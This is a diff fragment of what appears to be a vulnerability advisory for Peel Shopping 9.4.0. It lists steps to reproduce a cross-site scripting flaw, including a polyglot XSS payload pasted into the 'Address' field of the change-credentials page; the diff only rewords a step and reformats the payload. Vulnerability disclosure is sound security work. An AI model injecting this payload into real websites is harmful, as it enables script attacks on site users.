@@ -21,9 +21,9 @@ In Peel Shopping 9.4.0, a user supplied polyglot payload in the "Address" field 
 
 2. Navigate to the "Change my credentials" page (http://localhost/peel_9_4_0/utilisateurs/change_params.php)
 
-3. Paste the below payload in the "Address" field
+3. Paste the payload in the "Address" field
 
-`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`
+```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e```
 
 4. Click on "Change"
 
